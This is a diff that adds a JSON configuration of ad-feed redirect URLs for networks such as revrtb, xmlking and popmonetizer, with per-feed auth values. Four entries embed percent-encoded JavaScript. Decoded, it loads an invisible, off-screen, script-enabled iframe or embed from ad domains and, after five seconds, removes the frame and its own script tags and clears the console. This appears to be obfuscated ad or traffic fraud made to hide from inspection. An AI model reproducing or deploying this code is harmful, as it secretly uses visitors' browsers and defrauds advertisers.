@@ -1,0 +1,506 @@
+{
+    "urls": {
+        "KpWJvE8": [
+            "ad.adcharriot.com",
+            "revrtb",
+            "adchariot",
+            "https://xml.revrtb.net/redirect?feed=754893&auth=Bf8i&pubid=207137"
+        ],
+        "lxwOaJW": [
+            "ad.adcharriot.com",
+            "xmlking",
+            "adchariot",
+            "https://xml.xmlking.com/redirect?feed=754942&auth=AOiV&pubid=207138"
+        ],
+        "jyw6Wn5": [
+            "ad.adcharriot.com",
+            "xmlwiz",
+            "adchariot",
+            "https://xml.xmlwiz.com/redirect?feed=754953&auth=gt4W&pubid=207139"
+        ],
+        "bq9zen0": [
+            "xml.xmlsupply.com",
+            "revrtb_main",
+            "lala",
+            "https://xml.revrtb.net/redirect?feed=836699&auth=JdRC&pubid=215221"
+        ],
+        "lx923E6": [
+            "xml.xmlsupply.com",
+            "popmonetizer_main",
+            "lala",
+            "https://xml.popmonetizer.net/redirect?feed=836814&auth=qIgL&pubid=215222"
+        ],
+        "W39VeqE": [
+            "xml.xmlsupply.com",
+            "adxnexus_main",
+            "lala",
+            "https://xml.adxnexus.com/redirect?feed=836855&auth=vU1h&pubid=215223"
+        ],
+        "ED5jepv": [
+            "xml.xmlsupply.com",
+            "zeusadx",
+            "lala",
+            "https://xml.zeusadx.com/redirect?feed=800891&auth=Mwvs&pubid=215224"
+        ],
+        "A8jlepA": [
+            "xml.xmlsupply.com",
+            "acertb",
+            "lala",
+            "https://xml.acertb.com/redirect?feed=800872&auth=WsB5&pubid=215225"
+        ],
+        "dj9VdNR": [
+            "xml.xmlsupply.com",
+            "poprtb",
+            "lala",
+            "https://xml.poprtb.com/redirect?feed=800902&auth=H3RI&pubid=215226"
+        ],
+        "Yd9Ve2J": [
+            "xml.xmlsupply.com",
+            "xmlking_main",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=836868&auth=MX75&pubid=215228"
+        ],
+        "wdB2ANQ": [
+            "xml.xmlsupply.com",
+            "xmlwiz_main",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=836878&auth=dPaN&pubid=215229"
+        ],
+        "ED5je3r": [
+            "xml.xmlsupply.com",
+            "xmlwolf",
+            "lala",
+            "https://xml.xmlwolf.com/redirect?feed=800912&auth=50bp&pubid=215231"
+        ],
+        "Yd9Ve50": [
+            "xml.xmlsupply.com",
+            "popviking",
+            "lala",
+            "https://xml.popviking.com/redirect?feed=800927&auth=hmwV&pubid=215232"
+        ],
+        "y6B2lX0": [
+            "xml.xmlsupply.com",
+            "cachegorilla",
+            "lala",
+            "https://xml.cachegorilla.com/redirect?feed=800860&auth=6aHH&pubid=215230"
+        ],
+        "REpEaEN": [
+            "ad.adcharriot.com",
+            "popbutler",
+            "adcharriot",
+            "https://37.us.xmlap.com/feed/?link=true&tid=37",
+            "<script type=\"text/javascript\" class=\"nunush\">document.write(unescape('%3C%73%63%72%69%70%74%20%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%3E%0A%0A%66%75%6E%63%74%69%6F%6E%20%72%46%72%78%28%29%20%7B%0A%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%69%66%72%61%6D%65%5B%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%73%63%72%69%70%74%5B%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%63%6C%65%61%72%28%29%3B%0A%20%20%7D%2C%20%35%30%30%30%29%3B%0A%7D%0A%0A%72%46%72%78%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%61%64%2E%61%64%63%68%61%72%72%69%6F%74%2E%63%6F%6D%2F%73%75%62%2F%52%45%70%45%61%45%4E%22%20%73%74%79%6C%65%3D%22%76%69%73%69%62%69%6C%69%74%79%3A%68%69%64%64%65%6E%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%2D%35%30%30%30%70%78%3B%6C%65%66%74%3A%2D%35%30%30%30%70%78%3B%22%20%73%61%6E%64%62%6F%78%3D%22%61%6C%6C%6F%77%2D%73%63%72%69%70%74%73%20%61%6C%6C%6F%77%2D%70%6F%70%75%70%73%20%61%6C%6C%6F%77%2D%66%6F%72%6D%73%20%61%6C%6C%6F%77%2D%73%61%6D%65%2D%6F%72%69%67%69%6E%22%20%77%69%64%74%68%3D%22%31%39%32%30%22%20%68%65%69%67%68%74%3D%22%31%30%38%30%22%20%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%3E%3C%2F%69%66%72%61%6D%65%3E'));</script>"
+        ],
+        "GlDlEqN": [
+            "xml.xmlsupply.com",
+            "popbutler",
+            "xmlsupply",
+            "https://35.us.xmlap.com/feed/?link=true&tid=35",
+            "<script type=\"text/javascript\" class=\"nunush\">document.write(unescape('%3C%73%63%72%69%70%74%20%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%3E%0A%0A%66%75%6E%63%74%69%6F%6E%20%72%46%72%78%28%29%20%7B%0A%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%69%66%72%61%6D%65%5B%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%73%63%72%69%70%74%5B%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%63%6C%65%61%72%28%29%3B%0A%20%20%7D%2C%20%35%30%30%30%29%3B%0A%7D%0A%0A%72%46%72%78%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%69%66%72%61%6D%65%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%78%6D%6C%2E%78%6D%6C%73%75%70%70%6C%79%2E%63%6F%6D%2F%73%75%62%2F%47%6C%44%6C%45%71%4E%22%20%73%74%79%6C%65%3D%22%76%69%73%69%62%69%6C%69%74%79%3A%68%69%64%64%65%6E%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%2D%35%30%30%30%70%78%3B%6C%65%66%74%3A%2D%35%30%30%30%70%78%3B%22%20%73%61%6E%64%62%6F%78%3D%22%61%6C%6C%6F%77%2D%73%63%72%69%70%74%73%20%61%6C%6C%6F%77%2D%70%6F%70%75%70%73%20%61%6C%6C%6F%77%2D%66%6F%72%6D%73%20%61%6C%6C%6F%77%2D%73%61%6D%65%2D%6F%72%69%67%69%6E%22%20%77%69%64%74%68%3D%22%31%39%32%30%22%20%68%65%69%67%68%74%3D%22%31%30%38%30%22%20%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%3E%3C%2F%69%66%72%61%6D%65%3E'));</script>"
+        ],
+        "y6qKdp1": [
+            "xml.popadplus.com",
+            "revrtb_main",
+            "adcharriot",
+            "https://xml.revrtb.net/redirect?feed=836745&auth=IJwd&pubid=222560"
+        ],
+        "Q64pRXe": [
+            "xml.xmlsupply.com",
+            "revrtb_ron",
+            "lala",
+            "https://xml.revrtb.net/redirect?feed=836702&auth=sT29&pubid=215221"
+        ],
+        "y6Pn1jQ": [
+            "xml.popadplus.com",
+            "revrtb_ron",
+            "adcharriot",
+            "https://xml.revrtb.net/redirect?feed=836744&auth=yOyf&pubid=222560"
+        ],
+        "31Vl0de": [
+            "xml.xmlsupply.com",
+            "popmonetizer_ron",
+            "lala",
+            "https://xml.popmonetizer.net/redirect?feed=836817&auth=uok9&pubid=215222"
+        ],
+        "jyMKejx": [
+            "xml.popadplus.com",
+            "popmonetizer_main",
+            "adcharriot",
+            "https://xml.popmonetizer.net/redirect?feed=836829&auth=pkro&pubid=223609"
+        ],
+        "YdMKP44": [
+            "xml.popadplus.com",
+            "popmonetizer_ron",
+            "adcharriot",
+            "https://xml.popmonetizer.net/redirect?feed=836833&auth=MMmg&pubid=223609"
+        ],
+        "EDnR4G6": [
+            "xml.xmlsupply.com",
+            "adxnexus_ron",
+            "lala",
+            "https://xml.adxnexus.com/redirect?feed=836856&auth=yudO&pubid=215223"
+        ],
+        "zEGZK8Y": [
+            "xml.popadplus.com",
+            "adxnexus_main",
+            "adcharriot",
+            "https://xml.adxnexus.com/redirect?feed=836858&auth=9hyk&pubid=223610"
+        ],
+        "jyMKnkQ": [
+            "xml.popadplus.com",
+            "adxnexus_ron",
+            "adcharriot",
+            "https://xml.adxnexus.com/redirect?feed=836859&auth=EpaE&pubid=223610"
+        ],
+        "p1G6Kkl": [
+            "xml.xmlsupply.com",
+            "xmlking_ron",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=836869&auth=b3yg&pubid=215228"
+        ],
+        "qpGE9pe": [
+            "xml.popadplus.com",
+            "xmlking_main",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=836871&auth=v3mP&pubid=223614"
+        ],
+        "ZjMK2jq": [
+            "xml.popadplus.com",
+            "xmlking_ron",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=836872&auth=a5ql&pubid=223614"
+        ],
+        "k3MKZp0": [
+            "xml.xmlsupply.com",
+            "xmlwiz_ron",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=836881&auth=P5HQ&pubid=215229"
+        ],
+        "lxMGJJG": [
+            "xml.popadplus.com",
+            "xmlwiz_main",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=836886&auth=OxEF&pubid=223616"
+        ],
+        "6Y4AQ3y": [
+            "xml.popadplus.com",
+            "xmlwiz_ron",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=836887&auth=fBa0&pubid=223616"
+        ],
+        "npMd2kq": [
+            "xml.ppcxchange.com",
+            "revrtb_ron",
+            "lala",
+            "https://xml.revrtb.net/redirect?feed=806641&auth=fwI3&pubid=221740"
+        ],
+        "wdGR267": [
+            "xml.ppcxchange.com",
+            "popmonetizer_ron",
+            "lala",
+            "https://xml.popmonetizer.net/redirect?feed=806649&auth=Npqg&pubid=221746"
+        ],
+        "VyMKPzK": [
+            "xml.ppcxchange.com",
+            "adxnexus_ron",
+            "lala",
+            "https://xml.adxnexus.com/redirect?feed=806697&auth=6SmN&pubid=221766"
+        ],
+        "jyMK2vw": [
+            "xml.ppcxchange.com",
+            "xmlking_ron",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=806705&auth=5zFR&pubid=221772"
+        ],
+        "31Vl6Ve": [
+            "xml.ppcxchange.com",
+            "xmlwiz_ron",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=806721&auth=ZS0F&pubid=221784"
+        ],
+        "y6Pn2V1": [
+            "xml.ppcxchange.com",
+            "cachegorilla_ron",
+            "lala",
+            "https://xml.cachegorilla.com/redirect?feed=806713&auth=0rxz&pubid=221778"
+        ],
+        "EDnRjY6": [
+            "xml.ppcxchange.com",
+            "popviking_ron",
+            "lala",
+            "https://xml.popviking.com/redirect?feed=806737&auth=ne7W&pubid=221796"
+        ],
+        "GlJnEVM": [
+            "xml.popadplus.com",
+            "popviking_ron",
+            "lala",
+            "https://xml.popviking.com/redirect?feed=837414&auth=TeRp&pubid=223657"
+        ],
+        "W3MKzXJ": [
+            "xml.popadplus.com",
+            "cachegorilla_ron",
+            "lala",
+            "https://xml.cachegorilla.com/redirect?feed=836996&auth=0b3i&pubid=223623"
+        ],
+        "e6MK0aY": [
+            "xml.popadplus.com",
+            "acertb_ron",
+            "lala",
+            "https://xml.acertb.com/redirect?feed=837419&auth=Ps5A&pubid=223659"
+        ],
+        "6Y4Awjy": [
+            "xml.ppcxchange.com",
+            "acertb_ron",
+            "lala",
+            "https://xml.acertb.com/redirect?feed=806729&auth=RvtY&pubid=221790"
+        ],
+        "MDArX16": [
+            "xml.popadplus.com",
+            "zeusadx_ron",
+            "lala",
+            "https://xml.zeusadx.com/redirect?feed=837421&auth=tVJ5&pubid=223660"
+        ],
+        "JrlaXbO": [
+            "xml.ppcxchange.com",
+            "zeusadx_ron",
+            "lala",
+            "https://xml.zeusadx.com/redirect?feed=806753&auth=oTvj&pubid=221809"
+        ],
+        "xjMDZjN": [
+            "xml.popadplus.com",
+            "poprtb_ron",
+            "lala",
+            "https://xml.poprtb.com/redirect?feed=837422&auth=4ifn&pubid=223661"
+        ],
+        "wdGRnvd": [
+            "xml.ppcxchange.com",
+            "poprtb_ron",
+            "lala",
+            "https://xml.poprtb.com/redirect?feed=806745&auth=cW1h&pubid=221803"
+        ],
+        "W3MKXvN": [
+            "xml.ppcxchange.com",
+            "xmlwolf_ron",
+            "lala",
+            "https://xml.xmlwolf.com/redirect?feed=806906&auth=NaN9&pubid=221825"
+        ],
+        "5BxY3yq": [
+            "xml.popadplus.com",
+            "xmlwolf_ron",
+            "lala",
+            "https://xml.xmlwolf.com/redirect?feed=837424&auth=VeCX&pubid=223662"
+        ],
+        "a382xrw": [
+            "xml.bidfortraffic.com",
+            "revrtb_ron",
+            "lala",
+            "https://xml.revrtb.net/redirect?feed=890593&auth=Jak2&pubid=226952"
+        ],
+        "31YO3Q4": [
+            "xml.clickmediahub.com",
+            "revrtb_ron",
+            "lala",
+            "https://xml.revrtb.net/redirect?feed=890594&auth=HHkg&pubid=226953"
+        ],
+        "wdqvQ3j": [
+            "xml.admediaportal.com",
+            "revrtb_ron",
+            "lala",
+            "https://xml.revrtb.net/redirect?feed=890595&auth=Yw6s&pubid=226954"
+        ],
+        "a382xzb": [
+            "xml.bidfortraffic.com",
+            "popmonetizer_ron",
+            "lala",
+            "https://xml.popmonetizer.net/redirect?feed=890596&auth=9bgq&pubid=226955"
+        ],
+        "1Al68qr": [
+            "xml.clickmediahub.com",
+            "popmonetizer_ron",
+            "lala",
+            "https://xml.popmonetizer.net/redirect?feed=890597&auth=Kp69&pubid=226956"
+        ],
+        "qpxvWZQ": [
+            "xml.admediaportal.com",
+            "popmonetizer_ron",
+            "lala",
+            "https://xml.popmonetizer.net/redirect?feed=890598&auth=nfOT&pubid=226957"
+        ],
+        "8Y4RJlP": [
+            "xml.bidfortraffic.com",
+            "adxnexus_ron",
+            "lala",
+            "https://xml.adxnexus.com/redirect?feed=890599&auth=pal4&pubid=226958"
+        ],
+        "1Al68MG": [
+            "xml.clickmediahub.com",
+            "adxnexus_ron",
+            "lala",
+            "https://xml.adxnexus.com/redirect?feed=890600&auth=4iai&pubid=226959"
+        ],
+        "vq2P4G5": [
+            "xml.admediaportal.com",
+            "adxnexus_ron",
+            "lala",
+            "https://xml.adxnexus.com/redirect?feed=890601&auth=Js4m&pubid=226960"
+        ],
+        "y6jQMvQ": [
+            "xml.bidfortraffic.com",
+            "zeusadx_ron",
+            "lala",
+            "https://xml.zeusadx.com/redirect?feed=890602&auth=gEEM&pubid=226961"
+        ],
+        "djR688R": [
+            "xml.clickmediahub.com",
+            "zeusadx_ron",
+            "lala",
+            "https://xml.zeusadx.com/redirect?feed=890603&auth=5Nxu&pubid=226962"
+        ],
+        "jyN3qJ5": [
+            "xml.admediaportal.com",
+            "zeusadx_ron",
+            "lala",
+            "https://xml.zeusadx.com/redirect?feed=890604&auth=2Hrf&pubid=226963"
+        ],
+        "6Y7Xq3y": [
+            "xml.bidfortraffic.com",
+            "acertb_ron",
+            "lala",
+            "https://xml.acertb.com/redirect?feed=890605&auth=UFFA&pubid=226964"
+        ],
+        "5BV2bve": [
+            "xml.clickmediahub.com",
+            "acertb_ron",
+            "lala",
+            "https://xml.acertb.com/redirect?feed=890606&auth=gksm&pubid=226965"
+        ],
+        "Dbw0JE9": [
+            "xml.admediaportal.com",
+            "acertb_ron",
+            "lala",
+            "https://xml.acertb.com/redirect?feed=890607&auth=Fz5M&pubid=226966"
+        ],
+        "Pjw8qV0": [
+            "xml.bidfortraffic.com",
+            "poprtb_ron",
+            "lala",
+            "https://xml.poprtb.com/redirect?feed=890608&auth=rlBj&pubid=226967"
+        ],
+        "JrwdPBO": [
+            "xml.clickmediahub.com",
+            "poprtb_ron",
+            "lala",
+            "https://xml.poprtb.com/redirect?feed=890609&auth=s63p&pubid=226968"
+        ],
+        "e6DEydx": [
+            "xml.admediaportal.com",
+            "poprtb_ron",
+            "lala",
+            "https://xml.poprtb.com/redirect?feed=890610&auth=JR0I&pubid=226969"
+        ],
+        "Odw5VM9": [
+            "xml.bidfortraffic.com",
+            "xmlking_ron",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=890611&auth=7523&pubid=226970"
+        ],
+        "1Al29RO": [
+            "xml.clickmediahub.com",
+            "xmlking_ron",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=890612&auth=S6xy&pubid=226971"
+        ],
+        "Pjw8qzp": [
+            "xml.admediaportal.com",
+            "xmlking_ron",
+            "lala",
+            "https://xml.xmlking.com/redirect?feed=890613&auth=azxO&pubid=226972"
+        ],
+        "lxrDjEW": [
+            "xml.bidfortraffic.com",
+            "xmlwiz_ron",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=890614&auth=Hv9l&pubid=226973"
+        ],
+        "lxrDj4j": [
+            "xml.clickmediahub.com",
+            "xmlwiz_ron",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=890615&auth=iKlt&pubid=226974"
+        ],
+        "Dbw0J8l": [
+            "xml.admediaportal.com",
+            "xmlwiz_ron",
+            "lala",
+            "https://xml.xmlwiz.com/redirect?feed=890616&auth=djrd&pubid=226975"
+        ],
+        "8Y426kP": [
+            "xml.bidfortraffic.com",
+            "cachegorilla_ron",
+            "lala",
+            "https://xml.cachegorilla.com/redirect?feed=890621&auth=I64i&pubid=226976"
+        ],
+        "EDw0bZY": [
+            "xml.clickmediahub.com",
+            "cachegorilla_ron",
+            "lala",
+            "https://xml.cachegorilla.com/redirect?feed=890622&auth=ofGo&pubid=226977"
+        ],
+        "xjdJxzW": [
+            "xml.admediaportal.com",
+            "cachegorilla_ron",
+            "lala",
+            "https://xml.cachegorilla.com/redirect?feed=890623&auth=z2cG&pubid=226978"
+        ],
+        "5BV2q1N": [
+            "xml.bidfortraffic.com",
+            "xmlwolf_ron",
+            "lala",
+            "https://xml.xmlwolf.com/redirect?feed=890624&auth=boem&pubid=226979"
+        ],
+        "vq2XQjV": [
+            "xml.clickmediahub.com",
+            "xmlwolf_ron",
+            "lala",
+            "https://xml.xmlwolf.com/redirect?feed=890625&auth=2S38&pubid=226980"
+        ],
+        "2Yr2BJp": [
+            "xml.admediaportal.com",
+            "xmlwolf_ron",
+            "lala",
+            "https://xml.xmlwolf.com/redirect?feed=890626&auth=y66a&pubid=226981"
+        ],
+        "y6jQz5Z": [
+            "xml.bidfortraffic.com",
+            "popviking_ron",
+            "lala",
+            "https://xml.popviking.com/redirect?feed=890627&auth=0jhu&pubid=226982"
+        ],
+        "Byw1EaV": [
+            "xml.clickmediahub.com",
+            "popviking_ron",
+            "lala",
+            "https://xml.popviking.com/redirect?feed=890628&auth=jwZF&pubid=226983"
+        ],
+        "k3lRpk0": [
+            "xml.admediaportal.com",
+            "popviking_ron",
+            "lala",
+            "https://xml.popviking.com/redirect?feed=890629&auth=S8vB&pubid=226984"
+        ],
+        "zEDVjNp": [
+            "streamtape.online",
+            "revrtb",
+            "streamtape_direct",
+            "https://xml.revrtb.net/redirect?feed=1264373&auth=I7jl&pubid=223971",
+            "<script type=\"text/javascript\" class=\"nunush\">document.write(unescape('%3C%73%63%72%69%70%74%20%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%3E%0A%0A%66%75%6E%63%74%69%6F%6E%20%72%46%72%78%28%29%20%7B%0A%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%65%6D%62%65%64%5B%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%73%63%72%69%70%74%5B%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%63%6C%65%61%72%28%29%3B%0A%20%20%7D%2C%20%35%30%30%30%29%3B%0A%7D%0A%0A%72%46%72%78%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%65%6D%62%65%64%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%73%74%72%65%61%6D%74%61%70%65%2E%6F%6E%6C%69%6E%65%2F%73%75%62%2F%7A%45%44%56%6A%4E%70%22%20%74%79%70%65%3D%22%74%65%78%74%2F%68%74%6D%6C%22%20%73%74%79%6C%65%3D%22%76%69%73%69%62%69%6C%69%74%79%3A%68%69%64%64%65%6E%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%2D%35%30%30%30%70%78%3B%6C%65%66%74%3A%2D%35%30%30%30%70%78%3B%22%20%77%69%64%74%68%3D%22%31%39%32%30%22%20%68%65%69%67%68%74%3D%22%31%30%38%30%22%20%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%3E%3C%2F%65%6D%62%65%64%3E'));</script>"
+        ],
+        "GlzAOQj": [
+            "netu.live",
+            "revrtb",
+            "netu_direct",
+            "https://xml.revrtb.net/redirect?feed=1264372&auth=m6SR&pubid=126878",
+            "<script type=\"text/javascript\" class=\"nunush\">document.write(unescape('%3C%73%63%72%69%70%74%20%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%3E%0A%0A%66%75%6E%63%74%69%6F%6E%20%72%46%72%78%28%29%20%7B%0A%20%20%73%65%74%54%69%6D%65%6F%75%74%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%65%6D%62%65%64%5B%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%71%75%65%72%79%53%65%6C%65%63%74%6F%72%41%6C%6C%28%27%73%63%72%69%70%74%5B%63%6C%61%73%73%3D%22%6E%75%6E%75%73%68%22%5D%27%29%2E%66%6F%72%45%61%63%68%28%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%65%2E%70%61%72%65%6E%74%4E%6F%64%65%2E%72%65%6D%6F%76%65%43%68%69%6C%64%28%65%29%3B%0A%20%20%20%20%7D%29%3B%0A%20%20%20%20%63%6F%6E%73%6F%6C%65%2E%63%6C%65%61%72%28%29%3B%0A%20%20%7D%2C%20%35%30%30%30%29%3B%0A%7D%0A%0A%72%46%72%78%28%29%3B%0A%3C%2F%73%63%72%69%70%74%3E%0A%0A%3C%65%6D%62%65%64%20%73%72%63%3D%22%68%74%74%70%73%3A%2F%2F%6E%65%74%75%2E%6C%69%76%65%2F%73%75%62%2F%47%6C%7A%41%4F%51%6A%22%20%74%79%70%65%3D%22%74%65%78%74%2F%68%74%6D%6C%22%20%73%74%79%6C%65%3D%22%76%69%73%69%62%69%6C%69%74%79%3A%68%69%64%64%65%6E%3B%70%6F%73%69%74%69%6F%6E%3A%61%62%73%6F%6C%75%74%65%3B%74%6F%70%3A%2D%35%30%30%30%70%78%3B%6C%65%66%74%3A%2D%35%30%30%30%70%78%3B%22%20%77%69%64%74%68%3D%22%31%39%32%30%22%20%68%65%69%67%68%74%3D%22%31%30%38%30%22%20%63%6C%61%73%73%3D%22%6C%61%6C%61%76%69%74%61%22%3E%3C%2F%65%6D%62%65%64%3E'));</script>"
+        ]
+    }
+}
